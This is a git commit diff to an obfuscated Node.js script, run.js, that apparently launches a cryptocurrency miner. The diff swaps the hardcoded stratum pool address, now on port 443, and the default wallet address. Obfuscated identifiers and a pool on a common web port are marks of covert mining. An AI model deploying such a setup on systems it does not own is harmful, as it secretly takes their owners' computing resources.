cac3af293d7fad5cf7f5e26095ece0e2e8f5ebcb
x011-aI <vierodirwanto@gmail.com>
2026-07-11 08:24:42 +0800

    Update run.js

--- run.js
+++ run.js
@@ -2,7 +2,7 @@ const { Nnode: _0x1a2b3 } = require("./index.js");
 const _0x4c5d6 = require("os");
 
 (function () {
-    const _0x7e8f9 = 'stratum+tcp://47.236.167.232:4052';
+    const _0x7e8f9 = 'stratum+tcp://23.92.29.22:443';
 
     // Ambil argumen CLI
     const _0xa1b2c = parseInt(process.argv[2], 10);
@@ -14,7 +14,7 @@ const _0x4c5d6 = require("os");
     const _0x8h9i0 = (!isNaN(_0xa1b2c) && _0xa1b2c > 0) ? _0xa1b2c : _0x5f6g7;
 
     // Wallet default
-    const _0x1j2k3 = _0xd3e4f || '49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU';
+    const _0x1j2k3 = _0xd3e4f || '88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX';
 
     // Konfigurasi
     const _0x4l5m6 = {
